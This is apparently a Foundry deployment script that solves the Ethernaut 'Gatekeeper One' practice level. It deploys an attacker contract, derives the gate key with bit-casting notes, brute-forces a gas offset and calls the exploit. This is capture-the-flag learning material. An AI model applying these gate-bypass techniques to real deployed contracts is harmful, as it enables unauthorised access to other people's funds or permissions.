// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IGatekeeperOne } from "ethernaut/13-gatekeeper-one/IGatekeeperOne.sol";
import { GatekeeperOneAttacker } from "ethernaut/13-gatekeeper-one/GatekeeperOneAttacker.sol";

contract GatekeeperOneScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address gatekeeperOneAddr = vm.envAddress("L13_GATEKEEPER_ONE_ADDRESS");

        // Step 1: deploy attacker
        GatekeeperOneAttacker gatekeeperOneAttacker = new GatekeeperOneAttacker();
        // gGuessing `gateThree`:
        //
        // 0x 08 07 06 05 04 03 02 01 (bytes positions)
        // 0x 64 56 48 40 32 24 16 08 (uintX)
        //
        // 1st require: uint32 == uint16
        // 0x0000NNNN == 0xNNNN
        //
        // 2nd require: uint64 != uint32
        // 0xMM0000000000NNNN != 0x0000NNNN
        //
        // 3rd require: uint32 == uint16(tx.origin)
        // 0x0000900d == 0x900d
        //
        // NB: bytes8 gateKey = 0xFF0000000000900d;
        bytes8 gateKey1 = 0xff0000000000900d;

        // Step 2: get gas offset via brute force
        // uint256 divisor = 8191;
        // for (uint256 gasOffset; gasOffset < divisor;) {
        //     bool success = gatekeeperOneAttacker.exploit(gatekeeperOneAddr, gateKey1, 8191 * 5 + gasOffset);
        //     if (success) {
        //         console.logUint(gasOffset);
        //         break;
        //     }
        //     unchecked {
        //         ++gasOffset;
        //     }
        // }
        uint256 gasOffset = 256;

        // Step 3: exploit
        gatekeeperOneAttacker.exploit(gatekeeperOneAddr, gateKey1, 8191 * 5 + gasOffset);
        console.logAddress(IGatekeeperOne(gatekeeperOneAddr).entrant());

        vm.stopBroadcast();
    }
}
